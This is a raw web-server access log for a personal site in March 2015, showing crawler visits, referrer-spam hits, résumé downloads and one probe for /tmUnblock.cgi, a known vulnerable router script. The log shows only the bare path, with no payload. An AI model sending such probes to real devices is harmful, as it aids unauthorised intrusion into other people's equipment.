199.116.169.254 - - [12/Mar/2015:01:58:57 +0000] "GET /posts/WorkInProgress__Github_Webhooks_to_call_salt_highState HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
199.116.169.254 - - [12/Mar/2015:01:58:57 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
199.116.169.254 - - [12/Mar/2015:01:58:57 +0000] "GET /posts HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
85.25.43.94 - - [12/Mar/2015:03:08:31 +0000] "GET / HTTP/1.1" 200 3257 "-" "-"
85.25.43.94 - - [12/Mar/2015:03:08:31 +0000] "GET /robots.txt HTTP/1.1" 200 3257 "-" "-"
91.207.8.46 - - [12/Mar/2015:04:20:54 +0000] "GET / HTTP/1.1" 200 3257 "http://10sotok.info/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; FDM)"
91.207.8.46 - - [12/Mar/2015:04:20:55 +0000] "GET / HTTP/1.1" 200 3257 "http://10sotok.info/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; FDM)"
91.207.8.46 - - [12/Mar/2015:04:20:56 +0000] "GET / HTTP/1.1" 200 3257 "http://10sotok.info/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; FDM)"
67.198.144.204 - - [12/Mar/2015:04:33:24 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
180.76.4.9 - - [12/Mar/2015:04:43:28 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
128.61.240.66 - - [12/Mar/2015:05:43:11 +0000] "GET / HTTP/1.0" 200 3257 "-" "netscan.gtisc.gatech.edu"
62.210.206.117 - - [12/Mar/2015:06:13:01 +0000] "GET / HTTP/1.1" 200 3257 "-" "-"
66.249.69.245 - - [12/Mar/2015:06:30:45 +0000] "GET /rss/ HTTP/1.1" 304 0 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.4.207 - - [12/Mar/2015:06:45:51 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
54.80.152.134 - - [12/Mar/2015:07:46:25 +0000] "HEAD / HTTP/1.0" 200 0 "-" "-"
180.76.4.150 - - [12/Mar/2015:08:45:02 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
62.210.172.227 - - [12/Mar/2015:09:55:22 +0000] "GET /MattEllsworth-Devops-Resume.pdf HTTP/1.1" 200 151973 "-" "HttpComponents/1.1"
62.210.139.102 - - [12/Mar/2015:09:55:23 +0000] "GET /MattEllsworth-Devops-Resume.pdf HTTP/1.1" 200 151973 "-" "HttpComponents/1.1"
180.76.4.139 - - [12/Mar/2015:10:49:00 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
157.55.39.160 - - [12/Mar/2015:12:17:59 +0000] "GET /robots.txt HTTP/1.1" 200 3257 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.69.245 - - [12/Mar/2015:12:31:21 +0000] "GET /robots.txt HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.245 - - [12/Mar/2015:12:31:21 +0000] "GET /rss/ HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.4.135 - - [12/Mar/2015:12:41:43 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
167.57.0.185 - - [12/Mar/2015:13:58:02 +0000] "GET /tmUnblock.cgi HTTP/1.1" 400 181 "-" "-"
91.117.109.13 - - [12/Mar/2015:14:07:00 +0000] "GET / HTTP/1.1" 200 1158 "http://semalt.semalt.com/crawler.php?u=http://matthewellsworth.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
91.117.109.13 - - [12/Mar/2015:14:07:00 +0000] "GET /assets/bundle.css HTTP/1.1" 200 9878 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
